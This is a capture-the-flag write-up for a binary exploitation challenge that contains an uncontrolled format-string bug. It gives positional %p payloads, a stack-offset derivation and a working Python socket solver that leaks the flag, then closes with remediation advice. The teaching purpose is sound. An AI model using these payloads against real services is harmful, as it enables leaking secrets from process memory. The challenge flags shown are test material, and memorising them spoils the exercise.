# RST Hydro Event Logger — Writeup

**Category:** pwn / binary exploitation
**Vulnerability:** uncontrolled format string (CWE-134) → stack memory disclosure
**Flag:** `rstcon{f0rmat_str1ngs_l3ak_the_stack}`

---

## TL;DR

The service reads `flag.txt` into a stack buffer at startup, then passes your
one line of input straight to `printf()` as the *format string*. Because the
flag sits at a fixed offset on the same stack frame, a handful of positional
conversion specifiers (`%70$p … %79$p`) dump the flag's raw bytes, which decode
as little‑endian ASCII. No overflow, no leak of libc needed — pure info‑leak.

```
%70$p %71$p %72$p %73$p %74$p %75$p %76$p %77$p %78$p %79$p
```

---

## 1. Recon

```
$ file logger
logger: ELF 64-bit LSB executable, x86-64, dynamically linked,
        interpreter /lib64/ld-linux-x86-64.so.2, not stripped
```

| Property | Value |
|----------|-------|
| Arch     | x86‑64 |
| Type     | `EXEC` → **no PIE** (fixed base `0x400000`) |
| NX       | enabled |
| RELRO    | partial |
| Stripped | no |
| BuildID  | `8e1d6b807dd8dbb01dbb760daaf232eabcbc6aca` |

Imports worth noting: `fopen`, `fgets`, `fclose`, **`printf`**, `puts`,
`putchar`, `strcspn`, `memset`, `setvbuf`.

Interesting strings:

```
flag.txt
flag.txt missing on the server, tell an organizer.
RST Hydro event logger.
Submit one log line and it will be recorded:
logged:
```

A program that opens `flag.txt` **and** calls `printf` on our input is the
classic format‑string setup. Normal run:

```
$ echo "hello" | ./logger
RST Hydro event logger.
Submit one log line and it will be recorded:
logged: hello
```

---

## 2. Reversing `main`

Decompiled from the disassembly at `0x401236`:

```c
int main(void) {
    FILE *fp;               // rbp-0x08
    char  flag[0x50];       // rbp-0x60
    char  line[0x200];      // rbp-0x260

    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin,  NULL, _IONBF, 0);

    fp = fopen("flag.txt", "r");
    if (!fp) { puts("flag.txt missing on the server, tell an organizer."); return 1; }

    memset(flag, 0, 0x50);
    if (!fgets(flag, 0x50, fp)) { puts("flag.txt unreadable, ..."); return 1; }
    fclose(fp);
    flag[strcspn(flag, "\n")] = '\0';      // strip newline

    puts("RST Hydro event logger.");
    puts("Submit one log line and it will be recorded: ");

    if (!fgets(line, 0x200, stdin)) return 0;
    line[strcspn(line, "\n")] = '\0';      // strip newline

    printf("logged: ");                    // safe: constant format
    printf(line);                          // *** BUG: user input as format ***
    putchar('\n');
    return 0;
}
```

Key stack layout (same frame, growing downward):

```
rbp-0x260  ┌─────────────────────────────┐
           │  line[0x200]  (our input)   │
rbp-0x60   ├─────────────────────────────┤
           │  flag[0x50]   (the secret)  │
rbp-0x10   ├─────────────────────────────┤
rbp-0x08   │  fp                         │
rbp        └─────────────────────────────┘
```

The flag buffer (`0x50` bytes) sits **immediately above** the input buffer
(`0x200` bytes). That adjacency is the whole challenge.

---

## 3. The vulnerability

At `0x4013b7`:

```asm
lea    rax,[rbp-0x260]     ; rax = line (our input)
mov    rdi,rax             ; 1st arg to printf = format string = our input
mov    eax,0x0             ; 0 vector registers used
call   printf@plt
```

`printf(line)` with attacker‑controlled `line` and **no format arguments** is
an uncontrolled format string (CWE‑134). Supplying conversion specifiers makes
`printf` walk the stack and registers looking for arguments that were never
pushed — letting us read process memory (`%p`/`%x`/`%s`) or even write it
(`%n`). Here a read is all we need, because the flag is already on the stack.

---

## 4. Finding the offset

On x86‑64 SysV, `printf`'s first five variadic args come from registers
(`rsi, rdx, rcx, r8, r9` = positional `%1$`–`%5$`); stack‑passed args begin at
`%6$`. At the call site `rsp = rbp-0x260`, so:

```
%6$   = [rbp-0x260]   (start of the stack-arg area = our own input buffer)
%(6+k)$ = [rbp-0x260 + 8*k]
```

The flag is at `rbp-0x60 = rbp-0x260 + 0x200 = rbp-0x260 + 8*64`, so:

```
k = 64  →  flag starts at  %(6+64)$ = %70$
```

Confirmed empirically against a local dummy flag:

```
$ printf '%%60$lx|%%61$lx|...|%%82$lx\n' | ./logger
logged: ... |70:6d7230667b545352|71:6c5f7274735f7461|72:77705f7265676730|73:7d32345f6e| ...
```

Decoding each qword little‑endian:

```
70: 6d7230667b545352 -> "RST{f0rm"
71: 6c5f7274735f7461 -> "at_str_l"
72: 77705f7265676730 -> "0gger_pw"
73: 7d32345f6e        -> "n_42}"
```

→ `RST{f0rmat_str_l0gger_pwn_42}`. The flag buffer is `0x50` = 10 qwords, so
positions **`%70$`–`%79$`** cover any flag that fits. The offset is fixed by the
compiled frame (no PIE, no ASLR dependence for the *offset*), so it's identical
on the remote.

> Why not `%s`? The flag is stored *inline* on the stack as raw bytes, not as a
> pointer to a string. `%70$s` would treat the first 8 flag bytes as an address
> and segfault. Reading the words with `%p`/`%lx` and reassembling them is the
> correct move.

---

## 5. Exploit

```python
#!/usr/bin/env python3
# usage: python3 solve.py <host> <port>
import socket, sys, re

host, port = sys.argv[1], int(sys.argv[2])
payload = " ".join(f"%{i}$p" for i in range(70, 86)) + "\n"   # 70-79 + margin

s = socket.create_connection((host, port), timeout=10)
s.sendall(payload.encode())

buf = b""; s.settimeout(3)
try:
    while True:
        c = s.recv(4096)
        if not c: break
        buf += c
except socket.timeout:
    pass
s.close()

line = next(l for l in buf.decode("latin1","replace").splitlines()
            if l.startswith("logged:"))
words = re.findall(r"0x([0-9a-fA-F]+)|\(nil\)|\b([0-9a-fA-F]{2,16})\b",
                   line.split("logged:",1)[1])
data = b""
for a, b in words:
    w = a or b
    if w:
        data += int(w, 16).to_bytes(8, "little")
print("FLAG:", data.split(b"\x00",1)[0].decode("latin1","replace"))
```

```
$ python3 solve.py <host> 9002
FLAG: rstcon{f0rmat_str1ngs_l3ak_the_stack}
```

### Common dead end

Walking the stack with **sequential** `%p %p %p …` never reaches slot 70 — each
specifier consumes one slot, and the input buffer (and typical line caps) run
out long before you get there. Use **positional** `%70$p` to jump straight to
the target.

---

## 6. Flag

```
rstcon{f0rmat_str1ngs_l3ak_the_stack}
```

---

## 7. Remediation

The fix is to never pass untrusted data as a format string:

```c
printf("%s", line);     // instead of printf(line);
```

Defense in depth: compile with `-Wformat -Wformat-security -Werror=format-security`
(flags `printf(line)` at build time), and don't keep secrets on the same stack
frame as attacker‑reachable buffers. Full RELRO + PIE would also raise the cost
of the `%n`‑write variant of this bug class.
